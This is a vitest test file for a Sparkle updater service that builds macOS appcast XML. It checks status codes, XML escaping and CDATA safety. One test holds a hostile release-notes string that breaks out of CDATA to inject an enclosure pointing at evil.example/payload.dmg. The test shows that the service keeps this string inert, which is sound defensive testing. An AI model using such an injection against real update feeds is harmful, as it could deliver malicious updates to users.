import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as platform from "../../../../src/server/platform/platform-detector.js";
import * as sparkleUpdater from "../../../../src/server/services/updaters/sparkle-updater-service.js";
import * as helpers from "./test-helpers.js";

const CDATA_OPEN = "<description><![CDATA[";
const CDATA_CLOSE = "]]></description>";
const REOPEN = "]]]]><![CDATA[>";

/**
 * Returns the description character data, or undefined if the element is absent.
 * Deliberately parser-free: we assert the CDATA invariant directly rather than trusting a
 * third-party XML parser to model CDATA the way Sparkle's own parser does.
 */
function descriptionPayload(xml: string): string | undefined {
    const start = xml.indexOf(CDATA_OPEN);
    if (start < 0) {
        return undefined;
    }
    const from = start + CDATA_OPEN.length;
    const end = xml.indexOf(CDATA_CLOSE, from);
    if (end < 0) {
        return undefined;
    }
    return xml.substring(from, end);
}

/**
 * True when no `]]>` inside the payload can terminate the section: every terminator must be
 * part of a re-open sequence, which leaves the surrounding bytes as inert character data.
 */
function cdataIsInert(payload: string): boolean {
    return payload.split(REOPEN).join("").indexOf("]]>") < 0;
}

describe("SparkleUpdaterService", function () {
    let releaseSvc: helpers.MockReleaseService;
    let downloadSvc: helpers.MockDownloadService;
    let assetCacheSvc: helpers.MockAssetCache;
    let service: sparkleUpdater.SparkleUpdaterService;

    beforeEach(function () {
        releaseSvc = new helpers.MockReleaseService();
        downloadSvc = new helpers.MockDownloadService();
        assetCacheSvc = new helpers.MockAssetCache();
        service = new sparkleUpdater.SparkleUpdaterService(
            helpers.asReleaseService(releaseSvc),
            helpers.asDownloadService(downloadSvc),
            helpers.asAssetCache(assetCacheSvc),
            new platform.DefaultPlatformDetector()
        );
    });

    afterEach(function () {
        assetCacheSvc.close();
    });

    it("returns 204 when up to date", async function () {
        releaseSvc.setRelease(helpers.createRelease("v1.0.0", [helpers.createAsset("app-macos-universal.dmg")]));

        const result = await service.getAppcast({ appId: "app1", currentVersion: "v1.0.0" });

        expect(result.status).toBe(204);
        expect(result.body).toBeUndefined();
    });

    it("returns appcast XML for macOS", async function () {
        releaseSvc.setRelease(
            helpers.createRelease("v1.1.0", [
                helpers.createAsset("app-macos-universal.dmg"),
                helpers.createAsset("app-macos-universal.dmg.sig")
            ])
        );
        assetCacheSvc.registerSignature("app-macos-universal.dmg", "sparkle-sig");

        const result = await service.getAppcast({ appId: "app1", currentVersion: "v1.0.0" });

        expect(result.status).toBe(200);
        expect(result.contentType).toBe("application/xml");
        const xml = result.body as string;
        expect(xml.indexOf("<rss") >= 0).toBe(true);
        expect(xml.indexOf('sparkle:version="1.1.0"') >= 0).toBe(true);
        expect(xml.indexOf('sparkle:edSignature="sparkle-sig"') >= 0).toBe(true);
    });

    it("escapes XML special characters", async function () {
        const release = helpers.createRelease("v1.1.0", [helpers.createAsset("app-macos-universal.dmg")]);
        release.name = 'Release <special> & "test"';
        releaseSvc.setRelease(release);

        const result = await service.getAppcast({ appId: "app1", currentVersion: "v1.0.0" });

        const xml = result.body as string;
        expect(xml.indexOf("&lt;special&gt;") >= 0).toBe(true);
        expect(xml.indexOf("&quot;test&quot;") >= 0).toBe(true);
    });

    it("returns 404 when no release found", async function () {
        const result = await service.getAppcast({ appId: "app1", currentVersion: "v1.0.0" });

        expect(result.status).toBe(404);
    });

    it("returns 404 when no macOS asset found", async function () {
        releaseSvc.setRelease(helpers.createRelease("v1.1.0", [helpers.createAsset("app-windows-x64.exe")]));

        const result = await service.getAppcast({ appId: "app1", currentVersion: "v1.0.0" });

        expect(result.status).toBe(404);
    });

    it("neutralises a CDATA terminator in the release body so it cannot inject an enclosure", async function () {
        const release = helpers.createRelease("v1.1.0", [helpers.createAsset("app-macos-universal.dmg")]);
        release.notes =
            'x]]><enclosure url="https://evil.example/payload.dmg" sparkle:version="99.0.0" ' +
            'sparkle:os="macos" length="1" type="application/octet-stream" /><item><title>x</title>' +
            "<description><![CDATA[";
        releaseSvc.setRelease(release);

        const result = await service.getAppcast({ appId: "app1", currentVersion: "v1.0.0" });

        const xml = result.body as string;
        const payload = descriptionPayload(xml);
        // The hostile text is preserved verbatim as release notes - the operator should see
        // what the repo author wrote - but it must be inert character data, not elements.
        // This is the security property: with no early terminator, no injected tag can ever
        // become a sibling element, so a client resolving this feed sees only our enclosure.
        expect(payload).toBeDefined();
        expect(payload !== undefined && payload.indexOf("evil.example") >= 0).toBe(true);
        expect(cdataIsInert(payload !== undefined ? payload : "")).toBe(true);
        // The enclosure we generate is a real element and sits outside the notes.
        const descriptionEnd = xml.indexOf(CDATA_CLOSE);
        expect(descriptionEnd).toBeGreaterThan(-1);
        expect(xml.lastIndexOf("<enclosure ")).toBeGreaterThan(descriptionEnd);
        expect(result.status).toBe(200);
    });

    it("keeps the appcast well-formed when the release body contains CDATA terminators", async function () {
        const release = helpers.createRelease("v1.1.0", [helpers.createAsset("app-macos-universal.dmg")]);
        release.notes = "before ]]> middle ]]> after";
        releaseSvc.setRelease(release);

        const result = await service.getAppcast({ appId: "app1", currentVersion: "v1.0.0" });

        const xml = result.body as string;
        const payload = descriptionPayload(xml);
        expect(payload).toBeDefined();
        expect(cdataIsInert(payload !== undefined ? payload : "")).toBe(true);
        // Every terminator is either ours or a re-open, so the item is never truncated and
        // the real enclosure still reaches the client.
        const descriptionEnd = xml.indexOf(CDATA_CLOSE);
        const itemEnd = xml.indexOf("</item>");
        expect(descriptionEnd).toBeGreaterThan(-1);
        expect(itemEnd).toBeGreaterThan(descriptionEnd);
        expect(xml.indexOf("<enclosure ")).toBeGreaterThan(descriptionEnd);
        expect(result.status).toBe(200);
    });

    it("leaves an ordinary release body untouched", async function () {
        const release = helpers.createRelease("v1.1.0", [helpers.createAsset("app-macos-universal.dmg")]);
        releaseSvc.setRelease(release);

        const result = await service.getAppcast({ appId: "app1", currentVersion: "v1.0.0" });

        const xml = result.body as string;
        expect(descriptionPayload(xml)).toBe(release.notes);
    });
});
